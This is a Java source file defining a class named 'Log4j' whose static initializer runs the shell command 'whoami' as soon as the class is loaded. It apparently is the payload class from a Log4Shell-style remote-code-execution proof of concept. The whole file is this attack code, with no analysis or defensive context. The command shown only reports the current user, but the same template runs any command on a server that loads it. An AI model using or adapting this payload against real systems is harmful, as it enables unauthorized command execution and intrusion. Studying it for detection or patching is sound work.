public class Log4j {
    static {
        try {
            String cmd = "whoami";
            Runtime.getRuntime().exec(cmd).waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
